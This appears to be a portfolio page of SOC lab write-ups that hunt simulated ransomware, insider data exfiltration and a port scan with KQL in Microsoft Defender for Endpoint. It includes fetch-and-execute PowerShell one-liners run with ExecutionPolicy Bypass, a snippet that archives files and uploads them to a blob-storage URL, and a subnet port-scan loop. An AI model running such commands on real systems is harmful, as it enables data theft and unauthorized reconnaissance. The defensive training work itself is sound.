Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=4AwBhXAW90Q&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=29)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day2 1a:T2e31,
## Introduction

This investigation was conducted to examine suspicious file activity observed within the virtual machine samson-windows-, which was onboarded to Microsoft Defender for Endpoint (MDE). The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.

Using Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables â DeviceFileEvents and DeviceProcessEvents â was analyzed to reconstruct the attack sequence.

## Scenario Overview

A new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.

During lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:

"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin toâ¦"

The task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.

## Preparation

Prior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.

The first step was to establish a baseline of file activity to identify when the anomaly began.

## Data Collection

The analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(30m)
| summarize FileEvents = count() by bin(Timestamp, 5m)
| order by Timestamp asc
-------------------------------------------------------

Result: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.

## Data Analysis

### A. Mass File Modification and Extension Changes

To examine which file types were most affected, the following query was run:

-------------------------------------------------------
kql
DeviceFileEvents
| where DeviceName == VMName
| where ActionType in ("FileRenamed","FileCreated","FileModified")
| extend ext = tostring(split(FileName,".")[-1])
| summarize Count = count() by ext
| order by Count desc
-------------------------------------------------------

Observation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes â but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.

### B. Folder-Level Analysis (Staging Behaviour)

To determine where encryption occurred:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where ActionType == "FileCreated"
| summarize count() by Folder = extract(@"^(.*)\\[^\\]+$",1,FileName)
| order by count_ desc
-------------------------------------------------------

Result: High activity was isolated to a single user folder â C:\Users\samson\Desktop â confirming that encryption primarily targeted the Desktop directory.

### C. Identifying Script Execution

The next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where FileName has_any ("powershell","pwsh","cmd.exe","wscript.exe","cscript.exe","wmic.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:

ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {...}"

The initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.

### D. Tracing Child Processes and Persistence Mechanisms

To verify what PowerShell spawned:

-------------------------------------------------------
kql
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessFileName == "powershell.exe"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
-------------------------------------------------------

Result: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\Users\samson\AppData\Local\Temp â a common ransomware staging area.

### E. File Events Linked to User Folders

To focus on desktop encryption evidence:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(24h)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has_any("Desktop","\\Users\\")
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp desc
-------------------------------------------------------

Result:

A file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.

### F. Process Chain Correlation â Root Cause Determination

Finally, to reconstruct the infection path:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between (ago(120m) .. now())
| where FileName in~ ("powershell.exe","cmd.exe","services.exe","svchost.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc
-------------------------------------------------------

Findings:

1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.
2. This instance spawned cmd.exe, which registered background services.
3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.
4. These service-hosted processes performed the encryption routines on user data.

<InlineGallery images={pwncrypt-ransomware-investigation} title="PwnCrypt Ransomware Investigation and Analysis Process" />

## Investigation Summary

The analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.

Execution Chain:
senseir.exe â powershell.exe â cmd.exe â services.exe â svchost.exe â file encryption (.pwncrypt)

## Response and Containment

1. Isolated the compromised VM from the network using Defender's Isolate Device function.
2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.
3. Recommended a complete VM rebuild to remove any residual persistence.
4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.
5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.

## Documentation

Each phase of this investigation â preparation, data collection, analysis, and response â was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.

All queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.

## MITRE ATT&CK Mapping

The PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT&CK framework.

1. **Initial Access (T1204.002 â User Execution)**: Infection began through manual execution of a malicious PowerShell script.
2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.
3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.
4. **Privilege Escalation & Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.
5. **Discovery (T1082)**: Enumerated user directories such as C:\Users\samson\Desktop before encryption.
6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).

Overall, the attack followed a full ransomware kill chain â Execution â Persistence â Privilege Escalation â Defence Evasion â Impact â demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.

## Improvement and Lessons Learned

1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.
2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.
3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.
4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.
5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.

## Conclusion

The investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.

Although contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.

Through disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
1b:T290f,
## Introduction

This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.

The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.

My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.

## Scenario Overview

The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.

John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.

The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.

## Preparation

Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.

- Created VM and onboarded to Microsoft Defender for Endpoint
- RDP connection established to VM
- Downloaded and ran MDE onboarding package
- VM successfully reporting in Defender portal

### PowerShell Command

-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-------------------------------------------------------

This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.

In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.

## Data Collection

With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:

- DeviceFileEvents
- DeviceProcessEvents
- DeviceNetworkEvents

I ran an initial query to confirm that new records were appearing in real time.

### KQL Check for Recent Logs

-------------------------------------------------------
kql
DeviceFileEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.

## Data Analysis

The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.

### KQL â Detect Archive Process Activity

-------------------------------------------------------
kql
let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
let VMName = "samson-windows-";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
-------------------------------------------------------

Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.

Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.

## Investigation

To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.

### KQL â Correlate File and Process Activity

-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.

Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.

<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />

### Snippet of the Observed PowerShell Script

Simplified excerpt of ExfiltrateData.ps1

-------------------------------------------------------
powershell
Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
-------------------------------------------------------

The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.

## Response and MITRE ATT&CK Mapping

This activity mapped directly to several tactics within the MITRE ATT&CK Framework:

1. **T1059.001 â PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
2. **T1560 â Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
3. **T1074 â Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
4. **T1048 â Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
5. **T1082 â System Information Discovery (Discovery)**: System metadata was queried before execution.

Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.

## Documentation

Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.

This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.

## Improvement

Following the investigation, several security improvements were identified for the environment:

1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.

Together, these recommendations would help detect and contain future insider threat attempts before data is lost.

## Conclusion

This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.

Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.

This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
1c:T3430,
## Introduction

This threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.

The environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.

This scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.

## Scenario Overview

The issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.

The working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.

## Preparation

Before starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.

<InlineGallery images={vm-setup-onboarding} title="VM Setup and Microsoft Defender Onboarding Process" />

### PowerShell Command
-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-------------------------------------------------------

This PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.

After executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.

## Data Collection

Once the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.

I began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.

### KQL Check for Recent Network Logs
-------------------------------------------------------
kql
DeviceNetworkEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.

In a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.

## Data Analysis

The analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.

### KQL â Count Failed Connections
-------------------------------------------------------
kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by FailedConnectionsAttempts desc
-------------------------------------------------------

When the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.

To further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.

### KQL â Inspect All Failed Connections from a Specific IP
-------------------------------------------------------
kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
-------------------------------------------------------

Upon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.

At this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.

<InlineGallery images={network-investigation-analysis} title="Network Investigation and Analysis Process" />

## Investigation

To confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.

### KQL â Correlate Process Activity around the Port Scan Time
-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-12T13:15:03.9576325Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

The query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.

Upon logging into the VM, I located the file in C:\ProgramData\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.

### Snippet of the observed PowerShell script:
-------------------------------------------------------
powershell
for ($i=4; $i -le 10; $i++) {
   Test-NetConnection "10.0.0.$i" -Port 21,23,25,53,80,110,443
}
-------------------------------------------------------

Since the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.

After isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.

<InlineGallery images={port-scan-investigation-isolation} title="Port Scan Investigation and Device Isolation Process" />

## Response and MITRE ATT&CK Mapping

This scenario corresponded with several techniques in the MITRE ATT&CK Framework, helping align the observed activity with recognized adversarial tactics:

1. **Reconnaissance (T1046 â Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.
2. **Execution (T1059.001 â PowerShell)**: The PowerShell script was used as the execution medium for network probing.
3. **Privilege Escalation (T1078 â Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.
4. **Lateral Movement (T1021 â Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.

By isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.

## Documentation

Throughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.

This documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.

## Improvement

After analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.

Second, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.

Third, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.

Ultimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.

## Conclusion

The sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.

This hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.

Through structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)

9:["$","$L12",null,{"projectData":{"slug":"ubuntu-server-docker-portainer","title":"Ubuntu Server, Docker and Portainer Installation in My Homelab","description":"A detailed walkthrough of deploying Ubuntu Server with Docker and Portainer in my segmented cybersecurity homelab, including remote SSH management and VLAN integration.","date":"2025-07-03","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Ubuntu Server","Docker","Portainer","SSH","VLAN","Containerization","Homelab","Proxmox","Remote Management"],"content":"$13","image":"/images/projects/hardware-lab/ubuntu-docker-portainer.jpeg","technologies":[],"images":[{"src":"/images/projects/hardware-lab/Assigning cpu cores for processor.png","alt":"Assigning cpu cores for processor"},{"src":"/images/projects/hardware-lab/assigning internal network vlan30.png","alt":"Assigning internal network vlan30"},{"src":"/images/projects/hardware-lab/assigning ram.png","alt":"Assigning ram"},{"src":"/images/projects/hardware-lab/assigning storage.png","alt":"Assigning storage"},{"src":"/images/projects/hardware-lab/During server installation this shows our dhcp is active with right ip address.png","alt":"During server installation this shows our dhcp is active with right ip address"},{"src":"/images/projects/hardware-lab/Installing ubuntu server to create docker.png","alt":"Installing ubuntu server to create docker"},{"src":"/images/projects/hardware-lab/Logged into ubuntu server on proxmox.png","alt":"Logged into ubuntu server on proxmox"},{"src":"/images/projects/hardware-lab/Selecting ubuntu server image.png","alt":"Selecting ubuntu server image"},{"src":"/images/projects/hardware-lab/Starting ubuntu server installation.png","alt":"Starting ubuntu server installation"},{"src":"/images/projects/hardware-lab/summary of setup.png","alt":"Summary of setup"},{"src":"/images/projects/hardware-lab/Ubuntu server installation process running .png","alt":"Ubuntu server installation process running"},{"src":"/images/projects/hardware-lab/Pinging ubuntu server from my parrot OS.png","alt":"Pinging ubuntu server from my parrot OS"},{"src":"/images/projects/hardware-lab/SSHed into my ubuntu server from parrot OS.png","alt":"SSHed into my ubuntu server from parrot OS"},{"src":"/images/projects/hardware-lab/Docker installation from parrot OS on ubuntu server .png","alt":"Docker installation from parrot OS on ubuntu server"},{"src":"/images/projects/hardware-lab/Sudo docker run hello world test which shows docker installed.png","alt":"Sudo docker run hello world test which shows docker installed"},{"src":"/images/projects/hardware-lab/Portainer volume creation and installation.png","alt":"Portainer volume creation and installation"},{"src":"/images/projects/hardware-lab/sudo docker ps to see the port its running on.png","alt":"Sudo docker ps to see the port its running on"},{"src":"/images/projects/hardware-lab/accessing portainer dashboard in browser.png","alt":"Accessing portainer dashboard in browser"},{"src":"/images/projects/hardware-lab/Portainer dashboard.png","alt":"Portainer dashboard"},{"src":"/images/projects/hardware-lab/portainer dashboard 2.png","alt":"Portainer dashboard 2"}],"series":{"name":"Project 4.2: Ubuntu Server, Docker and Portainer Installation","part":1,"totalParts":1}},"relatedProjects":[{"slug":"project-4-4-wazuh-nessus-integration","title":"Project 4.4: Integrating Wazuh SIEM/XDR and Nessus in a Cybersecurity Home Lab","description":"A comprehensive walkthrough of deploying Wazuh SIEM/XDR for log correlation and Nessus for vulnerability scanning in a segmented cybersecurity homelab environment.","date":"2025-08-03","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Wazuh","SIEM","XDR","Nessus","Vulnerability Scanning","Security Monitoring","OPNsense","Docker","Parrot OS","Ubuntu","Proxmox","VLAN","Homelab","Blue Team"],"content":"$14","image":"/images/projects/hardware-lab/Image-header-for-project-4.4.jpeg","technologies":[],"images":[],"series":{"name":"Project 4.4: Integrating Wazuh SIEM/XDR and Nessus in a Cybersecurity Home Lab","part":1,"totalParts":1}},{"slug":"project-4-7-thehive-cortex-deployment","title":"Project 4.7: TheHive & Cortex Deployment in My Cybersecurity Home Lab","description":"Deploying TheHive incident response platform and Cortex automated analysis engine in my segmented cybersecurity home lab for enhanced SOC workflow capabilities.","date":"2025-08-15","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["TheHive","Cortex","Incident Response","SOC","Docker","Portainer","Cassandra","Elasticsearch","Case Management","Automated Analysis","Blue Team","Incident Management"],"content":"$15","image":"/images/projects/hardware-lab/The-Hive-and-Cortex.png","technologies":[],"images":[],"series":"hardware-lab"},{"slug":"vulnerable-machines-installation","title":"Vulnerable Machines Installation (Metasploitable2, DVWA, bWAPP, WebGoat)","description":"A comprehensive guide to installing and configuring vulnerable machines and applications in a segmented cybersecurity homelab for penetration testing and security training.","date":"2025-07-05","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"red","tags":["Metasploitable2","DVWA","bWAPP","WebGoat","Vulnerable Machines","Penetration Testing","Docker","MacVLAN","VLAN","Homelab","Proxmox","Cybersecurity","Security Training","Web Vulnerabilities","Containerization"],"content":"$16","image":"/images/projects/hardware-lab/Vulnerable machines installation.jpeg","technologies":[],"images":[{"src":"/images/projects/hardware-lab/1 Metasploitable Installation started.png","alt":"1 Metasploitable Installation started"},{"src":"/images/projects/hardware-lab/2 Not using any installation media.png","alt":"2 Not using any installation media"},{"src":"/images/projects/hardware-lab/3 leave all as is.png","alt":"3 leave all as is"},{"src":"/images/projects/hardware-lab/4 CPU.png","alt":"4 CPU"},{"src":"/images/projects/hardware-lab/5 RAM.png","alt":"5 RAM"},{"src":"/images/projects/hardware-lab/6 Placing it in the right segment of my network vlan10.png","alt":"6 